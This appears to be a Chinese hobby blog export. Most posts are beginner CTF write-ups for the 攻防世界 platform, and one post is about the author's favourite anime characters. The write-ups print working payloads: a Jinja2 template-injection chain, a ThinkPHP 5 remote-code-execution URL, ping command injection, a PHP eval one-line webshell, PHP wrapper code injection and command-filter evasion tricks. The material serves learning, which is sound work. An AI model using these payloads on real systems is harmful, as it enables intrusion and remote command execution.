[{"title":"攻防世界进阶1-6","url":"/2020/10/08/jinjie/","content":"## 垃圾博客第五氮\n\n废物的我在攻防世界看着wp刷题。。\n\n##### 1==baby_web       \n\n打开提示   初始页是啥：：\n\n输入index.php，发现马上跳了回来  `F12`  \n\n![image-20201008103322144](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008103322144.png)\n\n##### 2==Training-WWW-Robots        \n\n打开，根据题目头，访问`robots.txt`发现`fa0g.php`直接打开得到flag;\n\n  *robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。*\n\n##### 3==Web_python_template_injection\n打开，提示python模板注入，通过python的对象的继承来一步步实现文件读取和命令执行的的。所要执行的代码要被`{}`包括。\n\n首先 随便输入看代码是否会被执行\n\n![image-20201008133939744](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008133939744.png)\n\n输入的1+1被计算为2 。所以`{}`中的代码会被计算。接下来我们要通过注入代码来查找flag。\n\n![image-20201008134354381](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008134354381.png)\n\n接下来的我也看不懂。。不公通用代码放这，以及[大佬的细节解释](https://www.freebuf.com/column/187845.html)；\n\n类似的python模板注入的题通用的命令：`{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen(\"要执行的语句\").read()}}`\n\n![image-20201008135802719](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008135802719.png)\n\n##### 4==Web_php_unserialize\n\n打开，看到一段代码。。![img](https://raw.githubusercontent.com/overnight-miss-you/test/master/0137C50C.jpg)。。。看不懂。。接下来是大佬的解释。\n\n\n\n```php\n<?php \nclass Demo { \n    private $file = 'index.php';\n    public function __construct($file) { \n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() { //把file变量强行赋值为index.php\n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) { //判断var变量是否存在并且非NULL\n    $var = base64_decode($_GET['var']); //bse64解密var\n    if (preg_match('/[oc]:\\d+:/i', $var)) { //正则匹配$var出现(O:数字或者C:数字这样的形式)就直接退出。\n        die('stop hacking!'); //停止脚本并输出stop hacking!\n    } else {\n        @unserialize($var); //反序列化$var\n    } \n} else { \n    highlight_file(\"index.php\"); //对index.php进行语法高亮显示\n} \n?>\n```\n\n```php\n$A = new Demo ('fl4g.php');\n$C = serialize($A);                     //改变属性绕过wake up 函数\n$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤(把0:4换成0;+4)\n$C = str_replace(':1:',':2:',$C);     //  这句干嘛用的。。不懂！！\nvar_dump($C);\nvar_dump(base64_encode($C));            //base64加密\n```\n\n最后输入`var=...(跑出的代码)`得到flag。\n\n没看懂的也可以观看这个----->>[大佬笔记](https://www.guildhab.top/?p=990)\n\n##### 5==php_rce\n\n使用的是ThinkPHP v5的rce漏洞\n\n直接使用`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`\n\n![image-20201008151703541](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008151703541.png)\n\n并没有发现flag。查找flag..\n\n`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name \"flag*\"`\n\n![image-20201008152335242](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008152335242.png)\n\n或者`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /`\n\n![image-20201008152845130](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008152845130.png)\n\n打开flag文件，得到flag。\n\n`?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`\n\n##### 6==Web_php_include\n\n又是一段代码，还好不是很复杂。。\n\n![image-20201008154232747](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008154232747.png)\n\n构造php://input时要注意使用PHP，不然会被替换掉。。。  `F12`使用Max HackBar\n\n![image-20201008154531513](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008154531513.png)\n\n或者使用burpsuite抓包  改包也可以。\n\n![image-20201008160756756](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008160756756.png)\n\n或者使用`data`协议，输入`data: text/plain,<?php system(\"ls\"); ?>`\n\n![image-20201008162455141](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201008162455141.png)\n\n#### ！！!这次的菜鸡博客就到这里了，加藤 惠喊我回去睡觉了。！！！(づ｡◕ᴗᴗ◕｡)づ\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/timasag.gif\" style=\"zoom:150%;\" />"},{"title":"攻防世界入门","url":"/2020/10/07/himBHs-a/","content":"## 垃圾博客第四\n\n菜鸡的我在攻防世界看着wp刷题。。\n\n##### 1==查看源代码       右键查看源代码和在网址前加`view-source:`\n\n##### 2==get   post      php默认的是get请求    post请求可以抓包修改或者使用插件《Max HackBar》\n\n##### 3==robots     robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。可以使用直接访问robots.txt或者使用dirsearch扫目录  ....`**python dirsearch.py -u** **网址 -e \\*  （目录扫描） -s 1 加这个会仔细一点**`\n\n##### 4==backup       php的默认备份文件为index.php.bak。。直接打开即可\n\n##### 5==cookie    先查看cookie.php,在网络中查看cookie中的flag.\n\n![image-20201007203306377](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007203306377.png)\n\n​    或者使用抓包软件burosuite来抓包。\n\n![image-20201007204134270](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007204134270.png)\n\n##### 6==disabled_button    打开后是一个不能按的按钮：F12查看css发现\n\n![image-20201007205327194](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007205327194.png)\n\n直接把disabled删除。在点击按钮即可。\n\n![image-20201007210324451](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007210324451.png)\n\n##### 7==weak_auth      随便输入用户和密码   弹窗发现用户名是admin，抓包爆破密码。\n\n![image-20201007211844844](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007211844844.png)\n\n![image-20201007211645390](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007211645390.png)\n\n爆破成功 得到密码 ；\n\n![image-20201007212006234](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007212006234.png)\n\n登录得到flag。\n\n##### 8==command_execution     进入后发现一个ping\n\n![image-20201007213738234](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007213738234.png)\n\n先尝试 `127.0.0.1` ,发现ping通  在尝试用`&&`来执行多个命令:输入`127.0.0.1&&ls`\n\n![image-20201007214228844](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007214228844.png)\n\n发现可以多个命令执行  输入`127.0.0.1&&fing -name\"flag\"`来查找flag  \n\n![image-20201007214516223](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007214516223.png)\n\n`cat` 打开flag，即可。\n\n##### 9==simple_php   \n\n```HTML\n﻿<?php\nshow_source(__FILE__);\ninclude(\"config.php\");\n$a=@$_GET['a'];\n$b=@$_GET['b'];\nif($a==0 and $a){\n    echo $flag1;\n}\nif(is_numeric($b)){\n    exit();\n}\nif($b>1234){\n    echo $flag2;\n}\n?> \n```\n\n 如果$a等于0 and $a，输出$flag1\n 如果$b是<u>数字或者字符串</u>那么退出当前脚本\n 如果$b>1234，输出$flag2\n 所以，这里我们既要保证输出$a，$b，又要保证$b是数字\n\n```php\n字符串和数字比较使用==时,字符串会先转换为数字类型再比较\nvar_dump('a' == 0);//true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0\nvar_dump('123a' == 123);//true，这里'123a'会被转换为123\n```\n\n所以输出 `a==0&&b=2222a`可行  输出`a=b&&b=2344c`已可行。\n\n##### 10==xff_referer    \n\n![image-20201007220220898](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007220220898.png)\n\nxff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址\n\nreferer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址\n\n既然要伪造，先抓个包先。修改xff后\n\n![image-20201007221528866](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007221528866.png)\n\n伪造Referer:\n\n![image-20201007221652543](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007221652543.png)\n\n得到flag。\n\n##### 11==webshell    这里用上了一句话木马\n\n```\n  <?php @eval($_POST['shell']);?>  \n```\n\n直接蚁剑连接就行\n\n![image-20201007224217080](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007224217080.png)\n\n![image-20201007224251859](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007224251859.png)\n\n得到flag。===*一句话木马以后会常用  以及类似的图片码。这里不过多解释。*\n\n##### 12==simple_js     打开  \n\n ![image-20201007230753092](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007230753092.png)\n\n![image-20201007230405454](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201007230405454.png)\n\n提交Cyberpeace{70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65}无效\n\n使用python转码。\n\n```python\nb=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]\nfor i in b:\n    print(chr(i),end='')\n```\n\nASCII码转换为字符串为：：FAUX PASSWORD HAHA...没有啥子用\n\n`\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30`使用 16进制转文本后为55,56,54,79,115,69,114,116,107,49,50\n\n提交Cyberpeace{55,56,54,79,115,69,114,116,107,49,50}无效\n\n再次转码\n\n```python\nb=[55,56,54,79,115,69,114,116,107,49,50]\nfor i in b:\n    print(chr(i),end='')\n```\n\nASCII码转换为字符串为：：786OsErtk12\n\n提交Cyberpeace{786OsErtk12}成功！！\n\n##### ！！！这次的垃圾博客就到这了，我要边听麻衣学姐洗澡的声音边吃三碗饭去了！！！─=≡Σ(((つ•̀ω•́)つ\n\n![timg](https://raw.githubusercontent.com/overnight-miss-you/test/master/timg.gif)"},{"title":"字符过滤","url":"/2020/10/06/Characters of the filter/","content":"## 垃圾博客第二弹：\n\n简单的说一下，菜鸡的我混进大佬群的学习情况；\n\n#### 面对一些过滤题，我们可以使用一些简单的绕过方式：\n\n##### 如：过滤了`cat`我们可以使用与它类似的代码`tail`,`tac`,`nl`,`more less`,`od`\n\n`tac`与`cat`相反。是从尾到头列出查找的内容；\n\n`nl`是把文本加行号再标准输出；\n\n`more`将文本以一页一页的形式显示；（一般*space*显示下一页，不能显示上一页）\n\n`less`与`more`类似不过`less`为随意浏览，一般*space*显示下一页，`b`显示上一页）\n\n`od`以进制数的形式输出文本;   `-d`十进制；`-o`八进制（默认）；`-x`十六进制；`-c`ASCLL字符型\n\n#### 或者我们可以通过符号来进行绕过；\n\n##### 如：过滤了`cat`,`flag`,`php`,等重要命令时；\n\n我们可以使用符号来进行绕过：\n\n如：过滤cat时`c\\a\\t`,`c\"a\"t`,`c'a't`,\n\n过滤flag或php时`f\\lag.php`,`f'l'ag.php`,`fl??.php`.  `fla??php`,`f*`等。。  *<u>?<=>表示一个任意的一个字符</u>*       <u>（`*`表示的是自动补全后面的）</u>\n\n##### 当过滤了执行命令`system`时\n\n我们可以用 `passthur()`,`exec()`,`popen()`,代替。\n\n`passthru`直接将结果输出，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201004183355.png)\n\nexec ()函数与system()类似，也执行给定的命令，但不输出结果，而是返回结果的**最后一行**。如果要是输出多条；则需要在后面加参数`array`（不过我现在还不会用）\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201004183126.png)\n\npopen函数不会直接返回执行结果，而是返回一个文件指针，但命令已经执行。如果要输出文件指针，需要加`fread``。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201004190756.png)\n\n如果只是输出了一部分，可能是 300 不够 ，把300加大就行。\n\n##### 当一些重要的符号被过滤时\n\n如` `（空格）被过滤时;我们可以使用：`%09(tab)`,`$IFS$9`,`${IFS}`,`<(不太管用)`，`<>`,`%20`来代替` `\n\n`;`被过滤时，我们可以使用`?>`来代替\n\n​\t`()`被过滤时，php中不用括号的有 `echo`,和`include`等\n\n​         `echo`是用于字符串的输出;\n\n![image-20201005131720796](https://raw.githubusercontent.com/overnight-miss-you/test/master/image-20201005131720796.png)\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201005132452.png)\n\n或者使用`include`通过$_POST[1]来获取数据，但include包含的php文件不会在页面显示，所以需要使用伪协议。*<u>这里使用的是php://filter伪协议</u>*\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201005154013.png)\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201005154118.png)\n\n不过最后输出的是base64加密的形式输出的，在网页上解密即可。\n\n\n\n#### ！！！这篇垃圾博客就到这了，02叫我回家吃饭了。！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/QQ图片20201006210944.gif\" style=\"zoom:67%;\" />"},{"title":"三种伪协议","url":"/2020/10/06/php-input/","content":"## 垃圾博客第三弹\n\n前一弹，我们题到了*伪协议*\n\n这一蛋。我们就简单的讲解一些PHP中常用的三种伪协议`php://input`,`php://filter`,`php://data`\n\n（主要是博主太垃圾了  NB一点的我也不会.......）\n\n##### `php://input` 是个可以访问请求的原始数据的只读流。    POST 请求的情况下，最好使用 php://input，因为它不依赖于特定的 php.ini 指令。\n\n使用`php://input`协议需要条件：\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006203858.png)\n\n使用如下：：可以通过! burpsuite !抓包，修改数据来进行读取数据包。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006193113.png)\n\n也可以通过! Max HackBar !插件直接访问。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006193345.png)\n\n##### `php://filter`是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006195207.png)\n\n使用`base64`来读取数据的方法在[第一弹最后已经说过](https://overnight-miss-you.github.io/2020/10/04/Characters%20of%20the%20filter/)，在这不在复述。\n\n`php://filter`字符串处理方法来除去`exit`。\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006200426.png)\n\n！！`<?php exet;?>`是一个XML标签，我们可以通过`strip_tags`函数过滤它。\n\n不过.。![img](https://raw.githubusercontent.com/overnight-miss-you/test/master/19E64C43.jpg)我还不会以这个，先把代码放着:`php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php`。（看着和前面的有点像）。\n\n##### 最后就是`data`使用条件和`php://input`一样\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20200728205328780.PNG)\n\n并且`data`可以直接写入代码，形式如下：\n\n`data: text/plain,<?php 执行内容 ?>`,\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006205231.png)\n\n使用base64编码。。（红色划线部分为`<?php system('cat flag.php');?>`的base64加密）\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006204416.png)\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/20201006205504.png)\n\n`data:text/plain;base64,执行的代码（base64加密）`==可以绕过一些过滤；。\n\n\n#### ！！！这次的垃圾博客就到这了，<font color=#\\#66CCFF size>蕾姆</font>叫我去睡觉了！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/4dee2d4f78f0f736804edf150555b319eac413f8.gif\" style=\"zoom: 80%;\" />"},{"title":"亲爱的老婆们","url":"/2020/10/03/wife/","content":"# 我的第一次博客。\n\n也没啥好写的，简单的介绍一下我的老婆们吧\n\n### 第一位   02    《DARLING in the FRANXX》女主   非人类   \n\n ！！：但丝毫不影响她成为我老婆！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/B450BD5B570EB9EB3396888254512747.jpg\" style=\"zoom: 33%;\" />\n\n！！我个人最喜欢的图，隔着图片我都能感觉到我老婆的开心。。！！\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/02.jpg)\n\n### 第二位   蕾姆  《Re：从零开始的异世界生活》\n\n！！如果真爱一定有颜色，那一定是<font color=#\\#66CCFF size>蓝色</font>的，！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/F3448B48BF2D1D224A3897F896CAF896.jpg\" style=\"zoom:80%;\" />\n\n！！！蕾姆的爱，是其他老婆都不上的。！！\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D2024308495%252C2443360258%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！--当然，像我这么好的人 ，当然是一锅端的啊！！\n\n### 拉姆\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/57711035_p0_master1200.jpg\" style=\"zoom:130%;\" />\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/56596870_p0_master1200.jpg)\n\n### 爱蜜莉雅糖\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/58133782_p0_master1200.jpg\" style=\"zoom:130%;\" />\n\n### 第三位     麻衣学姐   《青春猪头少年系列》\n\n！！人活着，为的就是麻衣学姐！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D3322358111%252C28374637%2526fm%253D26%2526gp%253D0.jpg\" style=\"zoom:129%;\" />\n\n！！：梓川咲太--可是我师父！！\n\n不过！！咲太师傅的徒弟有那个不是==嘴上喊着师傅，心里惦记师娘的！！==\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D3559152491%252C2397488672%2526fm%253D26%2526gp%253D0.jpg\" style=\"zoom:;\" />\n\n### 第四位    加藤 恵    《路人女主的养成方法》\n\n！！先有圣人后有天，吾惠美如画中仙。！！\n\n<img src=\"https://raw.githubusercontent.com/overnight-miss-you/test/master/E485FAB40E237AC0EF2ABA70A588EC68.jpg\" style=\"zoom: 33%;\" />\n\n！！当然 ，那些附带的小老婆们。我怎么会抛弃呢！！\n\n###  泽村・スペンサー・英梨々（泽村·史宾瑟·英梨梨）\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/58777097_p0_master1200.jpg)\n\n### 霞ヶ丘 诗羽 （霞之丘诗羽）\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/60073240_p0_master1200.jpg)\n\n以及她们的合照！！\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/55176137_p0_master1200.jpg)\n\n### 第五位   雪之下雪乃 《我的青春恋爱物语果然有问题》\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D4274170206%252C2211927177%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！想屁吃，我老婆的秘密是不可能告诉你的。！！\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D729850800%252C3259256989%2526fm%253D26%2526gp%253D0.jpg)\n\n！！当然这里面的--大老师会教会你青春期的处事之道。！！\n\n### 第六位   时崎狂三 《约会大作战》\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D2220594314%252C1874710572%2526fm%253D26%2526gp%253D0.jpg)\n\n！！成也城哥，败也城哥。！！\n\n![](https://raw.githubusercontent.com/overnight-miss-you/test/master/u%253D78230359%252C1155115830%2526fm%253D26%2526gp%253D0.jpg)\n\n！！！！！！哎呀！  老婆太多有点数不过来了==！！\n\n====不写了，不写了。老婆们叫我回家吃饭了o(*////▽////*)q"}]